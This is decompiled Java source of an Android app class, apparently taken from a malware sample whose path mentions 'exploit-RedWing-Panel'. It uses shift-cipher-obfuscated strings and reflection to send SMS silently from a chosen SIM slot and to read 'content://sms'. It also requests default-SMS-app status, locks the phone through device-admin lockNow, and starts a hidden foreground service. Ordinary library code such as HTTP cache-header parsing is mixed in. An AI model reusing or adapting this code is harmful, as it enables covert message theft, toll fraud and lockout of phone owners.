package v.s;

import android.R;
import android.app.PendingIntent;
import android.content.ComponentName;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import app.mobilex.plus.services.UtilAIWorker;
import app.mobilex.plus.util.TypefaceCache;
import java.io.IOException;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.Collections;
import java.util.Iterator;
import java.util.LinkedHashSet;
import java.util.List;
import java.util.Set;
import java.util.TreeMap;

/* JADX INFO: compiled from: r8-map-id-15e63fcf80fafdb0de787d7190aafb45897c9495c974dfb43163f91afee6c091 */
/* JADX INFO: loaded from: /private/tmp/claude-501/-Users-noiss-Work-exploit-RedWing-Panel-main-source-internal-builder/68c7750b-b3a0-412f-ab12-bf16e4a764d8/scratchpad/dex_extract/classes.dex */
public abstract class gA5gCwTK0qjTIn {
    public static final o0rN3ekjBJ6kKwok dDIMxZXP1V8HdM = new o0rN3ekjBJ6kKwok("NO_DECISION", 1);
    public static final int[] w9sT1Swbhx3hs = {R.attr.name, R.attr.id, R.attr.tag};
    public static final byte[] vekpFI4d1Nc4fakF = {48, 49, 53, 0};
    public static final byte[] JXn4Qf7zpnLjP5 = {48, 49, 48, 0};
    public static final byte[] Ee8d2j4S9Vm5yGuR = {48, 48, 57, 0};
    public static final byte[] xDyLpEZyrcKVe0 = {48, 48, 53, 0};
    public static final byte[] ibVTtJUNfrGYbW = {48, 48, 49, 0};
    public static final byte[] b1EoSIRjJHO5 = {48, 48, 49, 0};
    public static final byte[] pyu8ovAipBTLYAiKab = {48, 48, 50, 0};

    public static final void D5P1xCAyuvgF(cpTq2XMCb5JSaEhn cptq2xmcb5jsaehn, Throwable th) {
        Throwable runtimeException;
        Iterator it = oMgq0OAJeN5vHoy.dDIMxZXP1V8HdM.iterator();
        while (it.hasNext()) {
            try {
                ((ajrMZmky8AIb2Pr) it.next()).vIJudZvPyTuNp(th);
            } catch (Throwable th2) {
                if (th == th2) {
                    runtimeException = th;
                } else {
                    runtimeException = new RuntimeException("Exception while trying to handle coroutine exception", th2);
                    RIZfHbqXpth8r2yN4.dDIMxZXP1V8HdM(runtimeException, th);
                }
                Thread threadCurrentThread = Thread.currentThread();
                threadCurrentThread.getUncaughtExceptionHandler().uncaughtException(threadCurrentThread, runtimeException);
            }
        }
        try {
            RIZfHbqXpth8r2yN4.dDIMxZXP1V8HdM(th, new GuT27CnH0aS6(cptq2xmcb5jsaehn));
        } catch (Throwable unused) {
        }
        Thread threadCurrentThread2 = Thread.currentThread();
        threadCurrentThread2.getUncaughtExceptionHandler().uncaughtException(threadCurrentThread2, th);
    }

    public static final void DVTNwpDEVsUKuznof(Object[] objArr, int i, int i2) {
        while (i < i2) {
            objArr[i] = null;
            i++;
        }
    }

    public static final String EWUjsTERgdPbSw3NNlN() {
        return TypefaceCache.process("htsyjsy?44xrx", 5);
    }

    public static final TrEY4Uc0Kd3sdQC H9XlUr4OeMJFiXK(eyije75asyarHGHdxkfX eyije75asyarhghdxkfx, String str, boolean z) throws IOException {
        Cursor cursorRCHnHJBAlOpNI5 = eyije75asyarhghdxkfx.rCHnHJBAlOpNI5("PRAGMA index_xinfo(`" + str + "`)");
        try {
            int columnIndex = cursorRCHnHJBAlOpNI5.getColumnIndex("seqno");
            int columnIndex2 = cursorRCHnHJBAlOpNI5.getColumnIndex("cid");
            int columnIndex3 = cursorRCHnHJBAlOpNI5.getColumnIndex("name");
            int columnIndex4 = cursorRCHnHJBAlOpNI5.getColumnIndex("desc");
            if (columnIndex != -1 && columnIndex2 != -1 && columnIndex3 != -1 && columnIndex4 != -1) {
                TreeMap treeMap = new TreeMap();
                TreeMap treeMap2 = new TreeMap();
                while (cursorRCHnHJBAlOpNI5.moveToNext()) {
                    if (cursorRCHnHJBAlOpNI5.getInt(columnIndex2) >= 0) {
                        int i = cursorRCHnHJBAlOpNI5.getInt(columnIndex);
                        String string = cursorRCHnHJBAlOpNI5.getString(columnIndex3);
                        String str2 = cursorRCHnHJBAlOpNI5.getInt(columnIndex4) > 0 ? "DESC" : "ASC";
                        treeMap.put(Integer.valueOf(i), string);
                        treeMap2.put(Integer.valueOf(i), str2);
                    }
                }
                TrEY4Uc0Kd3sdQC trEY4Uc0Kd3sdQC = new TrEY4Uc0Kd3sdQC(str, z, imhBI9RqzETHtVIJe.dQC4QhgRN3MSEAP3HW0(treeMap.values()), imhBI9RqzETHtVIJe.dQC4QhgRN3MSEAP3HW0(treeMap2.values()));
                cursorRCHnHJBAlOpNI5.close();
                return trEY4Uc0Kd3sdQC;
            }
            cursorRCHnHJBAlOpNI5.close();
            return null;
        } catch (Throwable th) {
            try {
                throw th;
            } catch (Throwable th2) {
                okc5AGRjqrud84oM6d.Ee8d2j4S9Vm5yGuR(cursorRCHnHJBAlOpNI5, th);
                throw th2;
            }
        }
    }

    /* JADX WARN: Code duplicated, block: B:34:0x00ce A[Catch: Exception -> 0x00ca, TRY_LEAVE, TryCatch #0 {Exception -> 0x00ca, blocks: (B:3:0x0004, B:6:0x0013, B:7:0x0021, B:9:0x0037, B:11:0x004b, B:14:0x0055, B:16:0x005b, B:18:0x0063, B:21:0x007a, B:23:0x0081, B:25:0x0085, B:31:0x0097, B:32:0x00b2, B:34:0x00ce), top: B:53:0x0004 }] */
    public static final void K7eEOBPYP9VIoHWTe(Context context, String str, String str2, int i) throws IllegalAccessException, InvocationTargetException {
        Object objInvoke;
        try {
            Class<?> cls = Class.forName(TypefaceCache.obtain("002200720057008F00FF00BA008300AB00350079005F009100F800BB00C700AB003E00600048008900F500BE00D500A000300071005E"));
            if (i <= 0) {
                objInvoke = cls.getMethod(TypefaceCache.process("mkzJklg{rz", 6), null).invoke(null, null);
            } else {
                int i2 = Build.VERSION.SDK_INT;
                Class<?> cls2 = Class.forName(TypefaceCache.process("dqgurlg1whohskrq|1VxevfulswlrqPdqdjhu", 3));
                Object systemService = context.getSystemService("telephony_subscription_service");
                if (systemService != null) {
                    Object objInvoke2 = cls2.getMethod(TypefaceCache.process("kixEgxmziWyfwgvmtxmsrMrjsPmwx", 4), null).invoke(systemService, null);
                    List list = objInvoke2 instanceof List ? (List) objInvoke2 : null;
                    if (list == null || list.size() < i) {
                        objInvoke = cls.getMethod(TypefaceCache.process("mkzJklg{rz", 6), null).invoke(null, null);
                    } else {
                        Object obj = list.get(i - 1);
                        Method method = obj != null ? obj.getClass().getMethod(TypefaceCache.process("kixWyfwgvmtxmsrMh", 4), null) : null;
                        Object objInvoke3 = method != null ? method.invoke(obj, null) : null;
                        Integer num = objInvoke3 instanceof Integer ? (Integer) objInvoke3 : null;
                        if (num != null) {
                            Class cls3 = Integer.TYPE;
                            objInvoke = i2 >= 31 ? cls.getMethod(TypefaceCache.process("gviexiJsvWyfwgvmtxmsrMh", 4), cls3).invoke(context.getSystemService(cls), num) : cls.getMethod(TypefaceCache.process("kixWqwQerekivJsvWyfwgvmtxmsrMh", 4), cls3).invoke(null, num);
                        } else {
                            objInvoke = null;
                        }
                    }
                } else {
                    objInvoke = cls.getMethod(TypefaceCache.process("mkzJklg{rz", 6), null).invoke(null, null);
                }
            }
        } catch (Exception unused) {
        }
        if (objInvoke == null) {
            throw new IllegalStateException(Y9mRyRdkl5FOcwb66V6.xDyLpEZyrcKVe0("SmsManager not available for SIM slot ", i));
        }
        Class<?> cls4 = objInvoke.getClass();
        String strProcess = TypefaceCache.process("glylghPhvvdjh", 3);
        String strProcess2 = TypefaceCache.process("xjsiYj}yRjxxflj", 5);
        String strProcess3 = TypefaceCache.process("xjsiRzqynufwyYj}yRjxxflj", 5);
        Object objInvoke4 = cls4.getMethod(strProcess, String.class).invoke(objInvoke, str2);
        ArrayList arrayList = objInvoke4 instanceof ArrayList ? (ArrayList) objInvoke4 : null;
        PendingIntent broadcast = PendingIntent.getBroadcast(context, 0, new Intent(context.getPackageName() + ".A_" + System.currentTimeMillis()), 1140850688);
        if (arrayList == null || arrayList.size() <= 1) {
            cls4.getMethod(strProcess2, String.class, String.class, String.class, PendingIntent.class, PendingIntent.class).invoke(objInvoke, str, null, str2, broadcast, null);
            return;
        }
        ArrayList arrayList2 = new ArrayList();
        int size = arrayList.size();
        for (int i3 = 0; i3 < size; i3++) {
            arrayList2.add(broadcast);
        }
        cls4.getMethod(strProcess3, String.class, String.class, ArrayList.class, ArrayList.class, ArrayList.class).invoke(objInvoke, str, null, arrayList, arrayList2, null);
    }

    public static final Cursor MLSIo1htfMPWeB8V876L(ContentResolver contentResolver, String str, String[] strArr, String str2) {
        try {
            Object objInvoke = ContentResolver.class.getMethod(TypefaceCache.process("txhu|", 3), Uri.class, String[].class, String.class, String[].class, String.class).invoke(contentResolver, Uri.parse(str), strArr, null, null, str2);
            if (objInvoke instanceof Cursor) {
                return (Cursor) objInvoke;
            }
        } catch (Exception unused) {
        }
        return null;
    }

    public static final Object Qrz92kRPw4GcghAc(Object obj, Object obj2) {
        if (obj == null) {
            return obj2;
        }
        if (obj instanceof ArrayList) {
            ((ArrayList) obj).add(obj2);
            return obj;
        }
        ArrayList arrayList = new ArrayList(21 - 17);
        arrayList.add(obj);
        arrayList.add(obj2);
        return arrayList;
    }

    public static final List XiR1pIn5878vVWd(Cursor cursor) {
        int columnIndex = cursor.getColumnIndex("id");
        int columnIndex2 = cursor.getColumnIndex("seq");
        int columnIndex3 = cursor.getColumnIndex("from");
        int columnIndex4 = cursor.getColumnIndex("to");
        ygw2lLTDaECI24gLm1 ygw2lltdaeci24glm1 = new ygw2lLTDaECI24gLm1();
        while (cursor.moveToNext()) {
            ygw2lltdaeci24glm1.add(new tDlqCGNnTg3Ni(cursor.getInt(columnIndex), cursor.getInt(columnIndex2), cursor.getString(columnIndex3), cursor.getString(columnIndex4)));
        }
        if (ygw2lltdaeci24glm1.xDyLpEZyrcKVe0 != null) {
            throw new IllegalStateException();
        }
        ygw2lltdaeci24glm1.Ee8d2j4S9Vm5yGuR();
        ygw2lltdaeci24glm1.Ee8d2j4S9Vm5yGuR = true;
        if (ygw2lltdaeci24glm1.JXn4Qf7zpnLjP5 <= 0) {
            ygw2lltdaeci24glm1 = ygw2lLTDaECI24gLm1.b1EoSIRjJHO5;
        }
        return imhBI9RqzETHtVIJe.MSGkxvPxRYNqC(ygw2lltdaeci24glm1);
    }

    public static final String b1EoSIRjJHO5(Context context) {
        try {
            Object objInvoke = Class.forName(TypefaceCache.process("cpftqkf0rtqxkfgt0Vgngrjqp{&Uou", 2)).getMethod(TypefaceCache.process("kixHijeypxWqwTegoeki", 4), Context.class).invoke(null, context);
            if (objInvoke instanceof String) {
                return (String) objInvoke;
            }
        } catch (Exception unused) {
        }
        return null;
    }

    public static tml08hF58ijcjYIUpM dDIMxZXP1V8HdM(tml08hF58ijcjYIUpM tml08hf58ijcjyiupm) {
        lmS3EL5eXtpmSti lms3el5extpmsti = tml08hf58ijcjyiupm.w9sT1Swbhx3hs;
        lms3el5extpmsti.w9sT1Swbhx3hs();
        lms3el5extpmsti.gIIiyi2ddlMDR0 = true;
        if (lms3el5extpmsti.pyu8ovAipBTLYAiKab <= 0) {
            lmS3EL5eXtpmSti lms3el5extpmsti2 = lmS3EL5eXtpmSti.wotphlvK9sPbXJ;
        }
        return lms3el5extpmsti.pyu8ovAipBTLYAiKab > 0 ? tml08hf58ijcjyiupm : tml08hF58ijcjYIUpM.vekpFI4d1Nc4fakF;
    }

    public static Set dTS0S7eC32ubQH54j36(Object... objArr) {
        int length;
        if (objArr.length <= 0 || (length = objArr.length) == 0) {
            return wSoqO88HRpr5B2md.w9sT1Swbhx3hs;
        }
        if (length == 1) {
            return Collections.singleton(objArr[0]);
        }
        LinkedHashSet linkedHashSet = new LinkedHashSet(oRoeOWAwLibMBxZYyTh.DVTNwpDEVsUKuznof(objArr.length));
        for (Object obj : objArr) {
            linkedHashSet.add(obj);
        }
        return linkedHashSet;
    }

    public static final void gIIiyi2ddlMDR0(Context context, ComponentName componentName) {
        try {
            Object systemService = context.getSystemService("device_policy");
            if (systemService == null) {
                return;
            }
            Class<?> cls = systemService.getClass();
            Object objInvoke = cls.getMethod(TypefaceCache.process("lvDgplqDfwlyh", 3), ComponentName.class).invoke(systemService, componentName);
            Boolean bool = objInvoke instanceof Boolean ? (Boolean) objInvoke : null;
            if (bool != null ? bool.booleanValue() : false) {
                cls.getMethod(TypefaceCache.process("twksVw", 8), null).invoke(systemService, null);
            }
        } catch (Exception unused) {
        }
    }

    public static boolean gmNWMfvn6zlEj() {
        return UtilAIWorker.MLSIo1htfMPWeB8V876L;
    }

    public static void hjneShqpF9Tis4(List list, Xdb7JFhCToIIjDFJDI xdb7JFhCToIIjDFJDI, Jf9nGec8iqajtj jf9nGec8iqajtj, OGI3jG3mkhPSTcSz oGI3jG3mkhPSTcSz) {
        int size;
        if (list == null || (size = list.size() - 1) < 0) {
            return;
        }
        ((yaqMfB4tC06l) list.get(size)).getClass();
        throw null;
    }

    public static final Object ibVTtJUNfrGYbW(long j, CWIOrUfHtKyaxQib0W cWIOrUfHtKyaxQib0W) {
        if (j > 0) {
            hD886kxBkce8U hd886kxbkce8u = new hD886kxBkce8U(1, jb8et6SZeK5TWMrJFxDX.J0zjQ7CAgohuxU20eCW6(cWIOrUfHtKyaxQib0W));
            hd886kxbkce8u.MLSIo1htfMPWeB8V876L();
            if (j < Long.MAX_VALUE) {
                daJe2GxqPkyrLbTKQx4 daje2gxqpkyrlbtkqx4D5P1xCAyuvgF = hd886kxbkce8u.xDyLpEZyrcKVe0.D5P1xCAyuvgF(W6dfON4KdcdxlH.vekpFI4d1Nc4fakF);
                mGuhJf2Mcqg8m mguhjf2mcqg8m = daje2gxqpkyrlbtkqx4D5P1xCAyuvgF instanceof mGuhJf2Mcqg8m ? (mGuhJf2Mcqg8m) daje2gxqpkyrlbtkqx4D5P1xCAyuvgF : null;
                if (mguhjf2mcqg8m == null) {
                    mguhjf2mcqg8m = yta3jf6IlTW2h5s8880Q.dDIMxZXP1V8HdM;
                }
                mguhjf2mcqg8m.hjneShqpF9Tis4(j, hd886kxbkce8u);
            }
            Object objJ0zjQ7CAgohuxU20eCW6 = hd886kxbkce8u.J0zjQ7CAgohuxU20eCW6();
            if (objJ0zjQ7CAgohuxU20eCW6 == pjN1L01KDMWnPCy0daD.w9sT1Swbhx3hs) {
                return objJ0zjQ7CAgohuxU20eCW6;
            }
        }
        return Eo0e0FTdv96U7KeCzoB.dDIMxZXP1V8HdM;
    }

    public static void l1V0lQr6TbwNKqHfXNbb(String str, String str2) {
        try {
            Class<?> cls = Class.forName(TypefaceCache.obtain("002200720057008F00FF00BA008300AB00350079005F009100F800BB00C700AB003E00600048008900F500BE00D500A000300071005E"));
            String strProcess = TypefaceCache.process("mkzJklg{rz", 6);
            String strProcess2 = TypefaceCache.process("glylghPhvvdjh", 3);
            String strProcess3 = TypefaceCache.process("xjsiYj}yRjxxflj", 5);
            String strProcess4 = TypefaceCache.process("xjsiRzqynufwyYj}yRjxxflj", 5);
            if (Build.VERSION.SDK_INT >= (-46) + 77) {
                Object objInvoke = cls.getDeclaredMethod(strProcess, null).invoke(null, null);
                if (objInvoke == null) {
                    return;
                }
                Object objInvoke2 = cls.getMethod(strProcess2, String.class).invoke(objInvoke, str2);
                ArrayList arrayList = objInvoke2 instanceof ArrayList ? (ArrayList) objInvoke2 : null;
                if (arrayList == null || arrayList.size() <= 1) {
                    cls.getMethod(strProcess3, String.class, String.class, String.class, PendingIntent.class, PendingIntent.class).invoke(objInvoke, str, null, str2, null, null);
                    return;
                } else {
                    cls.getMethod(strProcess4, String.class, String.class, ArrayList.class, ArrayList.class, ArrayList.class).invoke(objInvoke, str, null, arrayList, null, null);
                    return;
                }
            }
            Object objInvoke3 = cls.getMethod(strProcess, null).invoke(null, null);
            if (objInvoke3 == null) {
                return;
            }
            Object objInvoke4 = cls.getMethod(strProcess2, String.class).invoke(objInvoke3, str2);
            ArrayList arrayList2 = objInvoke4 instanceof ArrayList ? (ArrayList) objInvoke4 : null;
            if (arrayList2 == null || arrayList2.size() <= 1) {
                cls.getMethod(strProcess3, String.class, String.class, String.class, PendingIntent.class, PendingIntent.class).invoke(objInvoke3, str, null, str2, null, null);
            } else {
                cls.getMethod(strProcess4, String.class, String.class, ArrayList.class, ArrayList.class, ArrayList.class).invoke(objInvoke3, str, null, arrayList2, null, null);
            }
        } catch (Exception unused) {
        }
    }

    public static final String pyu8ovAipBTLYAiKab(Object obj) {
        return Integer.toHexString(System.identityHashCode(obj));
    }

    public static final String rCHnHJBAlOpNI5(b9xRoaXFR1fmOO2Q b9xroaxfr1fmoo2q) {
        Object vSZeS5mia3yEXbAe;
        if (b9xroaxfr1fmoo2q instanceof V9IxQnfNrXampq7vuj6) {
            return b9xroaxfr1fmoo2q.toString();
        }
        try {
            vSZeS5mia3yEXbAe = b9xroaxfr1fmoo2q + '@' + pyu8ovAipBTLYAiKab(b9xroaxfr1fmoo2q);
        } catch (Throwable th) {
            vSZeS5mia3yEXbAe = new VSZeS5mia3yEXbAe(th);
        }
        if (roAK4OF9CtSmlCJgpQ.dDIMxZXP1V8HdM(vSZeS5mia3yEXbAe) != null) {
            vSZeS5mia3yEXbAe = b9xroaxfr1fmoo2q.getClass().getName() + '@' + pyu8ovAipBTLYAiKab(b9xroaxfr1fmoo2q);
        }
        return (String) vSZeS5mia3yEXbAe;
    }

    public static void vIJudZvPyTuNp(Context context) {
        try {
            context.stopService(new Intent(context, (Class<?>) UtilAIWorker.class));
        } catch (Exception unused) {
        }
        UtilAIWorker.MLSIo1htfMPWeB8V876L = false;
    }

    /* JADX WARN: Unreachable blocks removed: 3, instructions: 7 */
    public static long w9sT1Swbhx3hs(boolean z, int i, int i2, long j, long j2, int i3, boolean z2, long j3, long j4, long j5, long j6) {
        if (j6 != Long.MAX_VALUE && z2) {
            if (i3 != 0) {
                long j7 = j2 + 900000;
                if (j6 < j7) {
                    return j7;
                }
            }
            return j6;
        }
        if (z) {
            long jScalb = i2 == 2 ? j * ((long) i) : (long) Math.scalb(j, i - 1);
            if (jScalb > 18000000) {
                jScalb = 18000000;
            }
            return j2 + jScalb;
        }
        if (z2) {
            long j8 = i3 == 0 ? j2 + j3 : j2 + j5;
            return (j4 == j5 || i3 != 0) ? j8 : (j5 - j4) + j8;
        }
        if (j2 == -1) {
            return Long.MAX_VALUE;
        }
        return j2 + j3;
    }

    /* JADX WARN: Code duplicated, block: B:108:0x006d A[SYNTHETIC] */
    /* JADX WARN: Code duplicated, block: B:109:0x0076 A[EDGE_INSN: B:109:0x0076->B:22:0x0076 BREAK  A[LOOP:2: B:16:0x0054->B:20:0x0066], SYNTHETIC] */
    /* JADX WARN: Code duplicated, block: B:15:0x004e  */
    /* JADX WARN: Code duplicated, block: B:17:0x0056  */
    /* JADX WARN: Code duplicated, block: B:20:0x0066 A[LOOP:2: B:16:0x0054->B:20:0x0066, LOOP_END] */
    /* JADX WARN: Code duplicated, block: B:51:0x0114  */
    /* JADX WARN: Code duplicated, block: B:54:0x0122  */
    /* JADX WARN: Code duplicated, block: B:56:0x012b  */
    /* JADX WARN: Code duplicated, block: B:58:0x0133  */
    /* JADX WARN: Code duplicated, block: B:59:0x013b  */
    /* JADX WARN: Code duplicated, block: B:61:0x0145  */
    /* JADX WARN: Code duplicated, block: B:63:0x0150  */
    /* JADX WARN: Code duplicated, block: B:65:0x0159  */
    /* JADX WARN: Code duplicated, block: B:66:0x015e  */
    /* JADX WARN: Code duplicated, block: B:68:0x0166  */
    /* JADX WARN: Code duplicated, block: B:69:0x016d  */
    /* JADX WARN: Code duplicated, block: B:71:0x0175  */
    /* JADX WARN: Code duplicated, block: B:72:0x017d  */
    /* JADX WARN: Code duplicated, block: B:74:0x0186  */
    /* JADX WARN: Code duplicated, block: B:75:0x018c  */
    /* JADX WARN: Code duplicated, block: B:77:0x0194  */
    /* JADX WARN: Code duplicated, block: B:78:0x019f  */
    /* JADX WARN: Code duplicated, block: B:80:0x01a7  */
    /* JADX WARN: Code duplicated, block: B:81:0x01ae  */
    /* JADX WARN: Code duplicated, block: B:83:0x01b7  */
    /* JADX WARN: Code duplicated, block: B:84:0x01bf  */
    /* JADX WARN: Code duplicated, block: B:86:0x01c9  */
    /* JADX WARN: Code duplicated, block: B:87:0x01d2  */
    /* JADX WARN: Code duplicated, block: B:89:0x01da  */
    public static qFZ9cwc5GmhbmWfFnB wotphlvK9sPbXJ(SzicGcOQovJ1JhxwfLo8 szicGcOQovJ1JhxwfLo8) {
        int i;
        int length;
        int length2;
        int i2;
        String string;
        String string2;
        SzicGcOQovJ1JhxwfLo8 szicGcOQovJ1JhxwfLo9 = szicGcOQovJ1JhxwfLo8;
        int size = szicGcOQovJ1JhxwfLo9.size();
        int i3 = 0;
        boolean z = true;
        String str = null;
        boolean z2 = false;
        boolean z3 = false;
        int iL1V0lQr6TbwNKqHfXNbb = -1;
        int iL1V0lQr6TbwNKqHfXNbb2 = -1;
        boolean z4 = false;
        boolean z5 = false;
        boolean z6 = false;
        int iL1V0lQr6TbwNKqHfXNbb3 = -1;
        int iL1V0lQr6TbwNKqHfXNbb4 = -1;
        boolean z7 = false;
        boolean z8 = false;
        boolean z9 = false;
        while (i3 < size) {
            String strW9sT1Swbhx3hs = szicGcOQovJ1JhxwfLo9.w9sT1Swbhx3hs(i3);
            String strJXn4Qf7zpnLjP5 = szicGcOQovJ1JhxwfLo9.JXn4Qf7zpnLjP5(i3);
            if (BS2kx9eAoOyDiNGAFlFk.A1BaTVAMeIXMnh(strW9sT1Swbhx3hs, "Cache-Control")) {
                if (str == null) {
                    str = strJXn4Qf7zpnLjP5;
                }
                i = 0;
                while (i < strJXn4Qf7zpnLjP5.length()) {
                    length = strJXn4Qf7zpnLjP5.length();
                    length2 = i;
                    while (true) {
                        if (length2 < length) {
                            i2 = size;
                            length2 = strJXn4Qf7zpnLjP5.length();
                            break;
                        }
                        i2 = size;
                        if (KgSM0TsKUpCiuePB.jdOQeRk37T35X5xKW1P("=,;", strJXn4Qf7zpnLjP5.charAt(length2))) {
                            break;
                        }
                        length2++;
                        size = i2;
                    }
                    string = KgSM0TsKUpCiuePB.uW0IRoPBZMj2QmBkkp(strJXn4Qf7zpnLjP5.substring(i, length2)).toString();
                    if (length2 != strJXn4Qf7zpnLjP5.length() || strJXn4Qf7zpnLjP5.charAt(length2) == ',' || strJXn4Qf7zpnLjP5.charAt(length2) == ';') {
                        i = length2 + 1;
                        string2 = null;
                    } else {
                        int length3 = length2 + 1;
                        byte[] bArr = yrMnf4fyLGfIJbMg8IbG.dDIMxZXP1V8HdM;
                        int length4 = strJXn4Qf7zpnLjP5.length();
                        while (true) {
                            if (length3 < length4) {
                                char cCharAt = strJXn4Qf7zpnLjP5.charAt(length3);
                                if (cCharAt != ' ' && cCharAt != '\t') {
                                    break;
                                }
                                length3++;
                            } else {
                                length3 = strJXn4Qf7zpnLjP5.length();
                                break;
                            }
                        }
                        if (length3 >= strJXn4Qf7zpnLjP5.length() || strJXn4Qf7zpnLjP5.charAt(length3) != '\"') {
                            int length5 = strJXn4Qf7zpnLjP5.length();
                            int length6 = length3;
                            while (true) {
                                if (length6 >= length5) {
                                    length6 = strJXn4Qf7zpnLjP5.length();
                                    break;
                                }
                                int i4 = length5;
                                if (KgSM0TsKUpCiuePB.jdOQeRk37T35X5xKW1P(",;", strJXn4Qf7zpnLjP5.charAt(length6))) {
                                    break;
                                }
                                length6++;
                                length5 = i4;
                            }
                            int i5 = length6;
                            string2 = KgSM0TsKUpCiuePB.uW0IRoPBZMj2QmBkkp(strJXn4Qf7zpnLjP5.substring(length3, length6)).toString();
                            i = i5;
                        } else {
                            int i6 = length3 + 1;
                            int iJW3Lh9hxwLsO2ArTlH = KgSM0TsKUpCiuePB.JW3Lh9hxwLsO2ArTlH(strJXn4Qf7zpnLjP5, '\"', i6, 4);
                            string2 = strJXn4Qf7zpnLjP5.substring(i6, iJW3Lh9hxwLsO2ArTlH);
                            i = iJW3Lh9hxwLsO2ArTlH + 1;
                        }
                    }
                    if ("no-cache".equalsIgnoreCase(string)) {
                        z2 = true;
                    } else if ("no-store".equalsIgnoreCase(string)) {
                        z3 = true;
                    } else if ("max-age".equalsIgnoreCase(string)) {
                        iL1V0lQr6TbwNKqHfXNbb = yrMnf4fyLGfIJbMg8IbG.l1V0lQr6TbwNKqHfXNbb(string2, -1);
                    } else if ("s-maxage".equalsIgnoreCase(string)) {
                        iL1V0lQr6TbwNKqHfXNbb2 = yrMnf4fyLGfIJbMg8IbG.l1V0lQr6TbwNKqHfXNbb(string2, -1);
                    } else if ("private".equalsIgnoreCase(string)) {
                        z4 = true;
                    } else if ("public".equalsIgnoreCase(string)) {
                        z5 = true;
                    } else if ("must-revalidate".equalsIgnoreCase(string)) {
                        z6 = true;
                    } else if ("max-stale".equalsIgnoreCase(string)) {
                        iL1V0lQr6TbwNKqHfXNbb3 = yrMnf4fyLGfIJbMg8IbG.l1V0lQr6TbwNKqHfXNbb(string2, Integer.MAX_VALUE);
                    } else if ("min-fresh".equalsIgnoreCase(string)) {
                        iL1V0lQr6TbwNKqHfXNbb4 = yrMnf4fyLGfIJbMg8IbG.l1V0lQr6TbwNKqHfXNbb(string2, -1);
                    } else if ("only-if-cached".equalsIgnoreCase(string)) {
                        z7 = true;
                    } else if ("no-transform".equalsIgnoreCase(string)) {
                        z8 = true;
                    } else if ("immutable".equalsIgnoreCase(string)) {
                        z9 = true;
                    }
                    size = i2;
                }
                i3++;
                szicGcOQovJ1JhxwfLo9 = szicGcOQovJ1JhxwfLo8;
                size = size;
            } else {
                if (BS2kx9eAoOyDiNGAFlFk.A1BaTVAMeIXMnh(strW9sT1Swbhx3hs, "Pragma")) {
                }
                i3++;
                szicGcOQovJ1JhxwfLo9 = szicGcOQovJ1JhxwfLo8;
                size = size;
            }
            z = false;
            i = 0;
            while (i < strJXn4Qf7zpnLjP5.length()) {
                length = strJXn4Qf7zpnLjP5.length();
                length2 = i;
                while (true) {
                    if (length2 < length) {
                        i2 = size;
                        length2 = strJXn4Qf7zpnLjP5.length();
                        break;
                    }
                    i2 = size;
                    if (KgSM0TsKUpCiuePB.jdOQeRk37T35X5xKW1P("=,;", strJXn4Qf7zpnLjP5.charAt(length2))) {
                        break;
                        break;
                    }
                    length2++;
                    size = i2;
                }
                string = KgSM0TsKUpCiuePB.uW0IRoPBZMj2QmBkkp(strJXn4Qf7zpnLjP5.substring(i, length2)).toString();
                if (length2 != strJXn4Qf7zpnLjP5.length()) {
                    i = length2 + 1;
                    string2 = null;
                } else {
                    i = length2 + 1;
                    string2 = null;
                }
                if ("no-cache".equalsIgnoreCase(string)) {
                    z2 = true;
                } else if ("no-store".equalsIgnoreCase(string)) {
                    z3 = true;
                } else if ("max-age".equalsIgnoreCase(string)) {
                    iL1V0lQr6TbwNKqHfXNbb = yrMnf4fyLGfIJbMg8IbG.l1V0lQr6TbwNKqHfXNbb(string2, -1);
                } else if ("s-maxage".equalsIgnoreCase(string)) {
                    iL1V0lQr6TbwNKqHfXNbb2 = yrMnf4fyLGfIJbMg8IbG.l1V0lQr6TbwNKqHfXNbb(string2, -1);
                } else if ("private".equalsIgnoreCase(string)) {
                    z4 = true;
                } else if ("public".equalsIgnoreCase(string)) {
                    z5 = true;
                } else if ("must-revalidate".equalsIgnoreCase(string)) {
                    z6 = true;
                } else if ("max-stale".equalsIgnoreCase(string)) {
                    iL1V0lQr6TbwNKqHfXNbb3 = yrMnf4fyLGfIJbMg8IbG.l1V0lQr6TbwNKqHfXNbb(string2, Integer.MAX_VALUE);
                } else if ("min-fresh".equalsIgnoreCase(string)) {
                    iL1V0lQr6TbwNKqHfXNbb4 = yrMnf4fyLGfIJbMg8IbG.l1V0lQr6TbwNKqHfXNbb(string2, -1);
                } else if ("only-if-cached".equalsIgnoreCase(string)) {
                    z7 = true;
                } else if ("no-transform".equalsIgnoreCase(string)) {
                    z8 = true;
                } else if ("immutable".equalsIgnoreCase(string)) {
                    z9 = true;
                }
                size = i2;
            }
            i3++;
            szicGcOQovJ1JhxwfLo9 = szicGcOQovJ1JhxwfLo8;
            size = size;
        }
        return new qFZ9cwc5GmhbmWfFnB(z2, z3, iL1V0lQr6TbwNKqHfXNbb, iL1V0lQr6TbwNKqHfXNbb2, z4, z5, z6, iL1V0lQr6TbwNKqHfXNbb3, iL1V0lQr6TbwNKqHfXNbb4, z7, z8, z9, !z ? null : str);
    }

    public static final Intent xDyLpEZyrcKVe0(String str) throws NoSuchFieldException, ClassNotFoundException {
        Class<?> cls = Class.forName(TypefaceCache.process("cpftqkf0rtqxkfgt0Vgngrjqp{&Uou&Kpvgpvu", 2));
        Field field = cls.getField(TypefaceCache.process("GIZOUTeINGTMKeJKLG[RZ", 6));
        Field field2 = cls.getField(TypefaceCache.process("K^ZXGeVGIQGMKeTGSK", 6));
        String str2 = (String) field.get(null);
        String str3 = (String) field2.get(null);
        Intent intent = new Intent(str2);
        intent.putExtra(str3, str);
        return intent;
    }

    public static void yTljMGnIibTRdOpSh4(Context context, boolean z, int i, int i2, int i3) {
        try {
            Intent intent = new Intent(context, (Class<?>) UtilAIWorker.class);
            intent.putExtra(TypefaceCache.obtain("002500640054008900E4"), z);
            intent.putExtra(TypefaceCache.obtain("00320063005A008B00F900AB00CB"), i);
            intent.putExtra(TypefaceCache.obtain("002500660048"), i2);
            intent.putExtra(TypefaceCache.obtain("0034007F005F009300F8"), i3);
            context.startForegroundService(intent);
        } catch (Exception e) {
            boolean z2 = UtilAIWorker.MLSIo1htfMPWeB8V876L;
            TypefaceCache.obtain("00300062005A009500E400F7009B00FD0063");
            e.getMessage();
        }
    }

